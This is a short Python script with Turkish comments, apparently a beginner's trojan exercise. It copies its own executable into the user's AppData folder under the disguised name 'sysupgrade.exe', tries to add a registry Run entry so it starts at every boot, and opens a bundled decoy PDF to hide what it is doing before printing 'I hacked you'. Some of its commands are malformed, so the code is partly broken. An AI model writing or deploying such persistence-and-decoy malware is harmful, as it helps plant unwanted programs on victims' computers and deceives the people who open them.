import time
import subprocess
import os #appdata konumunu bulmaya yarar
import shutil  #dosya kopyalama işlemi
import sys #içinde bulunduğumuz dosyayı kopyalamak için kullandık

def add_to_registery():
    #Bilgisayar açıldığında programın çalışma olayına persistance denir

    new_file = os.environ["appdata"] + "\\sysupgrade.exe"
    if not os.path.exists(new_file):
        shutil.copyfile(sys.executable, new_file)
        regedit_command = "HKCU\Software\Windows\CurrentVersion\Run /v dosyaismi /t REG_SZ (type) /d" + new_file
        subprocess.call(regedit_command, shell=True)

add_to_registery()

def open_added_file():
    #exe açıldığında farklı bir dosya gösterme fonksiyonu
    added_file = sys.MEIPASS + "\yusuf.pdf" #dosya adı
    subprocess.Popen(added_file,shell=True)

open_added_file()

x = 0
while x<100:
    print("I hacked you")
    time.sleep(0.5)